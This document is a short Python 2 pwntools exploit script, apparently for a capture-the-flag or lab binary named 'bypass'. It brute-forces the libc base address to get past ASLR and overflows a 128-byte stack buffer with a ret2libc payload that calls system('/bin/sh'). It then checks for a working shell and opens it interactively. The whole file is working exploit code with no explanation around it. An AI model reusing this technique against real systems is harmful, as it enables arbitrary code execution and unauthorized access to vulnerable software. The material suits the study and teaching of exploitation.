#!/usr/bin/python

import binascii
import os

from pwn import *

context(arch='x86', os='linux', endian='little', word_size=32)

for i in xrange(4242):
  libc = int('0xf75' + binascii.b2a_hex(os.urandom(1)) + '000', 16)
  print 'libc: ' + hex(libc)

  system = libc + 0x00040190
  shell = libc + 0x00160a24

  payload = ''
  payload += 'a' * 128   # buffer
  payload += 'b' * 12    # garbage and old ebp
  payload += p32(system) # system address
  payload += 'c' * 4     # fake return address for system
  payload += p32(shell)  # "/bin/sh" address

  p = process('./bypass')
  try:
    p.send(payload + '\n')
    p.send('echo test' + '\n')
    line = p.recvline(timeout=1)
    if line.strip() != 'test':
      p.close()
      continue
  except EOFError:
    p.close()
    continue
  p.interactive()
  p.close()
  break
